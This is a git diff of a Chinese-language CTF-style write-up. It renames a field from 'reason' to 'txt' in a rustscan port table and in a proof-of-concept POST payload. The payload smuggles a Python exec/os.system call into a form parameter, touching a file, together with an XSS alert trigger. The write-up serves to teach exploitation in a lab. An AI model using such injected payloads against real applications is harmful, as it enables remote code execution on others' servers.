@@ -25,7 +25,7 @@ PORT   STATE SERVICE
 2. rustscan扫描结果
 
 ```shell
-PORT   STATE SERVICE REASON
+PORT   STATE SERVICE txt
 22/tcp open  ssh     syn-ack
 53/tcp open  domain  syn-ack
 80/tcp open  http    syn-ack
@@ -196,7 +196,7 @@ input_key, expr = input_raw.split('=', 1)
 构造一个类似与 `input_key=<python expression>` 基于此基础修改POC,并且要保证其内部的触发xss检测
 
 ```lua
-to=Admin&link=/test&reason=abc=exec("""import os\nos.system("touch /tmp/114514")""");#<script>alert(1)</script>&issue=Getting error while accessing search feature in enterprise platform.
+to=Admin&link=/test&txt=abc=exec("""import os\nos.system("touch /tmp/114514")""");#<script>alert(1)</script>&issue=Getting error while accessing search feature in enterprise platform.
 ```
 
 ![20230306](https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_3/202303069.png)
